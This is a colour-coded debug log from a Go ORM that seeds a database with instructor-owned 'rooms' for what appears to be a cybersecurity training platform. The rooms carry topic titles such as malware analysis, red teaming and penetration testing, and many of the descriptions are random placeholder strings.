[0m[33m[8.816ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-12-09 14:07:52.674','2025-06-09 14:07:52.675',NULL,'secure coding practices','Writing code resistant to vulnerabilities',true,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.443ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.359ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-11-09 14:07:52.683','2025-06-09 14:07:52.684',NULL,'cloud security','Securing cloud infrastructure and services',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.522ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[9.940ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-10-09 14:07:52.689','2025-06-09 14:07:52.694',NULL,'malware analysis','Understanding and reverse-engineering malicious software',true,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.467ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.249ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-09-09 14:07:52.7','2025-06-09 14:07:52.701',NULL,'incident response','Handling and mitigating security breaches',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.446ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.254ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-08-09 14:07:52.706','2025-06-09 14:07:52.707',NULL,'advanced threat intelligence','Analyzing and anticipating cyber threats',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.413ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.205ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-07-09 14:07:52.712','2025-06-09 14:07:52.713',NULL,'iot security','Securing Internet of Things devices and networks',true,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.824ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-06-09 14:07:52.719','2025-06-09 14:07:52.72',NULL,'security operations center','Monitoring and defending organizational networks',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.410ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.180ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-05-09 14:07:52.727','2025-06-09 14:07:52.728',NULL,'social engineering defense','Protecting against human-factor exploits',false,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.492ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.050ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-04-09 14:07:52.736','2025-06-09 14:07:52.737',NULL,'blockchain security','Security aspects of blockchain technology',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.408ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.058ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-03-09 14:07:52.742','2025-06-09 14:07:52.743',NULL,'ethical hacking','Authorized penetration testing methodologies',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.418ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.983ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-02-09 14:07:52.748','2025-06-09 14:07:52.749',NULL,'advanced persistent threats','Understanding and defending against APTs',false,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.383ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[30.277ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2024-01-09 14:07:52.755','2025-06-09 14:07:52.756',NULL,'mobile security','Securing mobile devices and applications',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.425ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.439ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2023-12-09 14:07:52.785','2025-06-09 14:07:52.788',NULL,'red team operations','Simulating adversary attacks for defense',false,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.405ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[11.819ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2023-11-09 14:07:52.794','2025-06-09 14:07:52.795',NULL,'blue team defense','Implementing defensive security measures',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.507ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[9.270ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2023-10-09 14:07:52.806','2025-06-09 14:07:52.807',NULL,'security compliance','Understanding regulatory security requirements',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.403ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[18.946ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.815','2025-06-09 14:07:52.82',NULL,'ethical hacking and penteration testing part 0','qzqyjrGMCTMrLJKsUZZQVKVBcSLzxH',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[14.278ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.834','2025-06-09 14:07:52.836',NULL,'ethical hacking and penteration testing part 1','fBqEPyJxceQgtyBttTmaTlZprCLXYi',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.625ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.849','2025-06-09 14:07:52.85',NULL,'ethical hacking and penteration testing part 2','wIapeRMwsFwkRiRBiilCJObXHxXPso',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[12.366ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.858','2025-06-09 14:07:52.859',NULL,'ethical hacking and penteration testing part 3','IVjpPmUbCJaDWzrRaNGmCPtGhmMRZk',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.556ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.539ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.87','2025-06-09 14:07:52.871',NULL,'ethical hacking and penteration testing part 4','SbBnXRAeVIZCGejAQwrOhOPLPWvIaK',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.529ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.357ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.877','2025-06-09 14:07:52.878',NULL,'ethical hacking and penteration testing part 5','pFuOabQexURDgJFeOBOEcfKxxWhsvs',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[2.696ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[14.151ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.883','2025-06-09 14:07:52.887',NULL,'ethical hacking and penteration testing part 6','BUBKhXsIUjbNUvSBOgwMJYQTwITSkI',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.943ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.898','2025-06-09 14:07:52.899',NULL,'ethical hacking and penteration testing part 7','iULgNukRrCJHfehESSjKpskHeVgygF',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.466ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.806ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.905','2025-06-09 14:07:52.906',NULL,'ethical hacking and penteration testing part 8','lkqpcdrtXqmwEjXiPRUmmlfWBYuQxK',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[10.357ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.912','2025-06-09 14:07:52.913',NULL,'ethical hacking and penteration testing part 9','rrTOjqHaSkZSTcrSYqJcmnQJabvGwD',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.435ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.186ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.922','2025-06-09 14:07:52.923',NULL,'ethical hacking and penteration testing part 10','nRIqdkQLwyfSaZtBHhEirGkoGSZqHM',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.605ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.928','2025-06-09 14:07:52.929',NULL,'ethical hacking and penteration testing part 11','qKUutsFHGrNhqigeTNbHuovPHuefdV',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.451ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[10.049ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.935','2025-06-09 14:07:52.936',NULL,'ethical hacking and penteration testing part 12','FbnfQNwpamFLKzmeDhfutKdwqSfjaB',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.316ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.945','2025-06-09 14:07:52.946',NULL,'ethical hacking and penteration testing part 13','zYWSwhgkAEOOYRAwJaReokaWsYpSTO',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.413ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[7.565ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.952','2025-06-09 14:07:52.954',NULL,'ethical hacking and penteration testing part 14','bchJFSkYObgiEqrygxpnOAPhpBUnIa',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.401ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.081ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.959','2025-06-09 14:07:52.96',NULL,'ethical hacking and penteration testing part 15','OWkIqdcmCQetJRnTNvVqtPBQPRBBNj',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.660ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.642ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.966','2025-06-09 14:07:52.967',NULL,'ethical hacking and penteration testing part 16','nrVhMbYeiwpYkIlYoWPbNsEEblYlAV',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.430ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[7.087ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.972','2025-06-09 14:07:52.974',NULL,'ethical hacking and penteration testing part 17','UCtjWYmutBhoItsdgxcEvVzZGBEQee',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[9.209ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.98','2025-06-09 14:07:52.983',NULL,'ethical hacking and penteration testing part 18','lKxAQpgttgyockSNhhUeGfleewjSXn',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.417ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.381ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.989','2025-06-09 14:07:52.99',NULL,'ethical hacking and penteration testing part 19','abOViuRPVDZsSngaGNxmNeDYimIkZM',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.421ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[19.534ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:52.995','2025-06-09 14:07:53',NULL,'ethical hacking and penteration testing part 20','hbIvwXUvagGgIlUclWUlIfgmnShAei',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[7.626ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.015','2025-06-09 14:07:53.017',NULL,'ethical hacking and penteration testing part 21','eEmZCMZujyqXqbuAlLYUOzVfnsriEd',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.472ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
